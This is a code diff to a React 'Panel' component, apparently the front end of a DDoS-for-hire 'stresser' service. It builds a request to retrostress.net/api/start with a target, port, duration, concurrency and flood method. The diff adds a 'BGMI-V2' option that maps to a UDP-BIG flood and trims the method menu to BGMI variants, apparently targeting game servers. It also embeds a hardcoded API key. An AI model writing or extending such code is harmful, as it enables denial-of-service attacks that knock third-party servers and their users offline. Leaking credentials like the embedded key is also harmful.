@@ -101,7 +101,11 @@ export default function Panel() {
       try {
         setApiError(null);
         const apiKey = "639c040c5f5a16ffe9b56de90f3831cf5df5364524bc5610003efc864493b5b5"; 
-        const apiUrl = `https://retrostress.net/api/start?key=${apiKey}&target=${target}&port=${port || '80'}&time=${finalDuration}&method=${method}&concurrent=${finalConns}`;
+        let apiMethod = method;
+        if (method === 'BGMI-V2') {
+          apiMethod = 'UDP-BIG';
+        }
+        const apiUrl = `https://retrostress.net/api/start?key=${apiKey}&target=${target}&port=${port || '80'}&time=${finalDuration}&method=${apiMethod}&concurrent=${finalConns}`;
         
         // We use mode: 'no-cors' so the browser doesn't block the request if the API server lacks CORS headers
         // Note: With 'no-cors', we cannot read the response body or status.
@@ -386,7 +390,7 @@ export default function Panel() {
                       zIndex: 20,
                       boxShadow: '0 4px 20px rgba(0,0,0,0.5)'
                     }}>
-                      {['UDP-PPS', 'UDP-TINY', 'UDP-BIG', 'BGMI'].map((m) => (
+                      {['BGMI-V2', 'BGMI'].map((m) => (
                         <div 
                           key={m}
                           onClick={() => {
